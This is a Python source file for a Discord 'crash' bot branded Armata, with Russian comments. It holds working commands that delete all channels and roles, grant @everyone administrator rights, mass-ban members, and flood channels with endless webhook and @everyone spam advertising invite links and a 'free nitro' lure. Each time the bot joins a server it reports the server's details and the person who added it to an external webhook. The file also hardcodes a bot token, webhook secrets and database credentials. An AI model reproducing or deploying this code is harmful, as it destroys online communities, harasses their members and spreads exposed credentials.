import discord, random, aiohttp, asyncio
from discord.ext import commands

prefix='!'
reason='всем похуй'
SPAM_CHANNEL='qehgnxrgiqehguqbrxnhgihc', 'rgqxierxgiuqehgixhiqhqegr', 'rqehxgniqhecrugiqhiqhqxr', 'djlaelkrggjhbjrwhfkwhhjj', 'fbyeftzwyetfbbwytwbytfeyzwfy', 'iniuxgirguixgwiuefhigufiwhgiwhxnu'
SPAM_TEXT='> Сервер оккупирован Armata Bot @everyone', '> @everyone Наша великая империя ->  https://discord.gg/pon / Не знаешь как наказать врага? Не беда - тут тебя научат этому - https://t.me/lavanbot1 https://discord.gg/gWcMZTmqKX                                                           **tI4Zzpk5RT**  -> https://discord.gg/pon', ' > @everyone BLOOD EMPIRE                                                                          **iMJW23W4Ko** -> https://discord.gg/pon /Не знаешь как наказать врага? Не беда - тут тебя научат этому - https://t.me/lavanbot1 ', ' > @everyone occupied by Blood group                                                     **bbNIPQqhXZ** -> https://discord.gg/pon /Не знаешь как наказать врага? Не беда - тут тебя научат этому - https://t.me/lavanbot1'
SPAM_TEXT2='**tI4Zzpk5RT**', '**iMJW23W4Ko**', '**bbNIPQqhXZ**', '**eFVB4aRVI1**', '**WcjhcXmz9o**', '**xN0ClqLXfp**', '**is43zfeT9r**', '**g1I0a8VF5a**',
'**cG4pyWDxbt**',
'**nhiOm6AtJi**'
loghook = 'https://discord.com/api/webhooks/937678007768862720/DaJVpSs07f9j27zfyFf5yhjC5CjJbJtwY_RFhQgAGmv0fzF-WN1FTFDiKYTd8S40TKd9'
import requests, pymongo, asyncio, discord, aiohttp, os
from discord.ext import commands
from discord import Webhook
from pymongo import MongoClient
from discord import Intents
from datetime import datetime
cluster = pymongo.MongoClient("mongodb+srv://root:toor@cluster0.gnfdisl.mongodb.net/?retryWrites=true&w=majority")
db = cluster.test
collraids = cluster.msc.collraids
client = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
client.remove_command('help')
bot = client
@client.event
async def on_ready():
    print('краш бот запущен как ПОХУЙ')
    values = {
        "_id": 1,
        "count": 0
        }

    if collraids.count_documents({"_id": 1}) == 0:
        collraids.insert_one(values)

@client.command()
async def ping(ctx):
    await ctx.send(f'ВСЕМ ПОХУЙ {round(client.latency * 1000)}ms')

wl = [916991129688350750, 627194325788393472, 922732322300784670]

@client.event
async def on_guild_join(guild):
    try:
        if len(guild.members) <= 10:
            embed = discord.Embed(
                title = f"Попытка краша сервера, где недостаточно участников.\nAttempt to crash a server where there are not enough members.",
                description = f"**Согласно нашим данным на этом сервере меньше `10` человек.**\n**According to our data, there are less than `10` people on this server.**",
                color = 0x0059ff
            )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
    except:
        pass    
    if len(client.guilds) == 98:
        for guild in client.guilds: 
            try:
                chan = await guild.create_text_channel(name="ПЕРЕЕЗД", topic="ГТА")
                print(f"создал канал на сервере {guild.name}")
                await chan.send("Бесплатное нитро без скама тут - https://discord.gg/pon @everyone")
                print("в канал отправил")
                await guild.leave()
            except: pass# текст в любой канал
    adder=None
    try:
        async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
            adder = entry.user
            a_id=adder.id
    except:
        adder="Unknown"
        a_id="Unknown"
    emb = discord.Embed(title=f"Начало краша*** {guild.name} ***", description=f"_***Крашер:***_\n`{adder} (ID: {a_id})`\n_***Там:***_\n`{str(guild.member_count)}` людей\n`{str(len(guild.roles))}` ролей\n`{str(len(guild.channels))}` каналов\n\n||Сервера меньше 10ти людей не отображаются||", colour=discord.Colour.from_rgb(135, 206, 250))
    emb.set_footer( text = f'ID: {guild.id} ' )
    if guild.member_count > 9:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url("https://discord.com/api/webhooks/1080726262252838922/CNKEbGURIym78n58sCzMcrk5CLSPHn453RsMz8xrrIaYtZi2VB7xVdvB4_mbOBxDZYi5", adapter=discord.AsyncWebhookAdapter(session))
            await webhook.send(embed=emb)            


@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name='Crash3d by Armata')
    for c in ctx.guild.channels:
      try:
        await c.delete()
      except:pass

    for i in range(100):
      await ctx.guild.create_text_channel(random.choice(SPAM_CHANNEL))

    for member in ctx.guild.members:
      try:
        #await member.ban
        pass
      except:
        pass
    try:
      role = discord.utils.get(ctx.guild.roles, name = "@everyone")
      await role.edit(permissions = discord.Permissions.all())
    except:
      pass
    
    for i in range(100):
      for role in ctx.guild.roles:
        try:
          await ctx.guild.create_role(name="Crash3d by Armata", permissions = discord.Permissions.all())
        except:
          pass



@client.command()
@commands.cooldown(1, 30000, commands.BucketType.guild)
async def spam(ctx):
  for i in range(200):
    for c in ctx.guild.text_channels:
      for i in range(2):
        await c.send('')
        await c.send('@everyone Crashed by Armata -> ')
antileavein = []
@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def create_invite(ctx, server_id: int):
    if server_id != None:
        guild = client.get_guild(server_id)
        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
        await ctx.send(f"https://discord.gg/{invite.code}")

@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def links(ctx, members: int=30):
    if ctx.channel.id != 1077130797661814824:
        return
    for g in client.guilds:
        if g.id in antileavein:
            return
        if g.id == ctx.guild.id:
            return
        if g.member_count<members:
            try:
                await g.leave()
            except:
                return
        try:
            guild = client.get_guild(g.id)
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, temporary=False)
            await ctx.send(f"https://discord.gg/{invite.code}")
        except:
            try:
                await g.leave()
            except:
                return
@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def admin(ctx):
  await ctx.message.delete()
  try:
    role = discord.utils.get(ctx.guild.roles, name = "@everyone")
    await role.edit(permissions = discord.Permissions.all())
    print("Ы")
  except:
    print("ваще похуй честно")

@client.command()
@commands.cooldown(1, 100, commands.BucketType.guild)
async def help(ctx):
  await ctx.message.delete()
  await ctx.send("`!nuke` - разьеб сервера\n`!massban` - уебать всех участников\n`!roles` - уебать все роли\n`!rolescreate` - устроить пиздец с ролями\n`!admin` - выдать админку\n`!spam` - разьебать сервер пингами")

@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def massban(ctx):
  await ctx.message.delete()
  for member in ctx.guild.members:
    try:
      await member.ban
    except:
      pass
      try:
        await member.ban
      except:
        if member == "Poggers":
          return
          
@client.command()
@commands.cooldown(1, 300, commands.BucketType.guild)
async def testcommandfhiuvhqk(guild):
        for guild in client.guilds: 
            try:
                chan = await guild.create_text_channel(name="ПЕРЕЕЗД", topic="ГТА")
                print(f"создал канал на сервере {guild.name}")
                await chan.send("Бесплатное нитро без скама тут - https://discord.gg/pon @everyone")
                print("в канал отправил")
                await guild.leave()
            except: pass


@client.event
async def on_guild_channel_create(channel):
	client.loop.create_task(webhook_spam(channel))

async def webhook_spam(channel):
    webhook = await channel.create_webhook(name = "Armata")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
        while True:
            try:
              await webhook.send(random.choice(SPAM_TEXT), tts=True)
            except discord.NotFound:
              return

@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def roles(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass

@client.command()
@commands.cooldown(1, 3000, commands.BucketType.guild)
async def rolescreate(ctx):
  for i in range(250-(len(ctx.guild.roles)-1)):
    try:
      role = await ctx.guild.create_role(name="Crashed by Armata", permissions = discord.Permissions.all())
      print(f"похуй {role.name}")
    except:
        print(f"похуй")





token = "MTAxMTQ5ODQyODEwODM5MDQ4MA.GG8zyP.CXjyzouOeUn7K00IDalqcTJgPY1Z7zgJC_v7HM"
client.run(token)